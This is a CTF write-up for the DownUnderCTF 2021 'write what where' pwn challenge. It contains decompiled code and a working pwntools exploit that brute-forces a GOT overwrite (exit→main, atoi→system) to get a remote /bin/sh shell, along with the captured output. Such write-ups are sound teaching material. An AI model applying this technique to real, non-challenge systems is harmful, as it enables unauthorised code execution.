# DownUnderCTF 2021

## write what where

> 310
> 
> You've got one write. What do you do?
>
> Author: joseph#8210
>
> `nc pwn-2021.duc.tf 31920`
>
> [`write-what-where`](write-what-where) [`libc.so.6`](libc.so.6)

Tags: _pwn_ _x86-64_ _write-what-where_ _remote-shell_ _got-overwrite_


## Summary

Brute force GOT overwrite using free _write-what-where_.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Partial RELRO = GOT overwrite; No PIE = Easy ROP; No canary = Easy BOF.


### Decompile with Ghidra   

```c
void main(EVP_PKEY_CTX *param_1)
{
  int iVar1;
  long in_FS_OFFSET;
  undefined4 local_2c;
  char local_28 [24];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  init(param_1);
  puts("write");
  puts("what?");
  read(0,&local_2c,4);
  puts("where?");
  read(0,local_28,9);
  iVar1 = atoi(local_28);
  *(undefined4 *)(long)iVar1 = local_2c;
  exit(0);
}
```

So, yeah, _write-what-where_.  You can write any 4 bytes just about anywhere you want (that is `rw` memory).

There may be better ways to solve this, less crude ways, but I immediately considered a simple brute force solution (done it before).

First we need multiple _write-what-where_ exploits.  The first is obvious, change `exit` in the GOT to be `main`.

The next _w-w-w_ will change `atoi` to `system`, however because of ASLR there's only a 1 in 16 chance it will work _and_ `atoi` and `system` have to be within the same `0x10000` bytes.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./write-what-where')

context.log_level = 'WARN'

attempt = 0
while True:
    try:
        if args.REMOTE:
            p = remote('pwn-2021.duc.tf', 31920)
            libc = ELF('./libc.so.6')
            tout = 1.0
        else:
            p = process(binary.path)
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
            tout = 0.5

        assert(libc.sym.system - libc.sym.atoi + (libc.sym.atoi & 0xfff) < 0x10000), '\nthis libc will not work\n'
        
        attempt += 1
        log.warn('attempt: ' + str(attempt))

        p.sendafter(b'what?\n',p32(binary.sym.main))
        p.sendafter(b'where?\n',str(binary.got.exit).encode())

        p.sendafter(b'what?\n',p32(((libc.sym.system | 0xf000) & 0xffff) << 16))
        p.sendafter(b'where?\n',str(binary.got.atoi - 2).encode())

        p.sendafter(b'what?\n',b'0000',timeout=tout)
        p.sendafter(b'where?\n',b'/bin/sh\0',timeout=tout)

        p.sendline(b'echo shell')
        if b'shell' in p.recvline(timeout=tout):
            p.interactive()
            break
    except AssertionError as err:
        print(err)
        sys.exit(1)
    except:
        try:
            p.close()
        except:
            continue
```

This is brute force, so we'll need a loop.

The `assert` checks if the `libc` is even an option.  Otherwise we need to find a different approach.

Next we'll change `exit` to `main`.

On our second pass we'll replace the last 4 nibbles of `atoi` with `system` starting with `0xf`.

> We only need to overwrite 2 bytes (4 nibbles) so the actually write is 2 less than the address of the `atoi` GOT entry.

On the last pass, the `what` no longer matters, just the `where`; if the `atoi` conversion to `system` worked our input of `/bin/sh` for `where` will give us a shell.

Crash?  We'll leverage ASLR and try again.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/downunderctf2021/write-what-where/write-what-where'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[!] attempt: 1
[!] attempt: 2
[!] attempt: 3
[!] attempt: 4
[!] attempt: 5
[!] attempt: 6
$ cat flag.txt
DUCTF{arb1tr4ry_wr1t3_1s_str0ng_www}
```

> My shortest number of attempts was 5, longest was 29.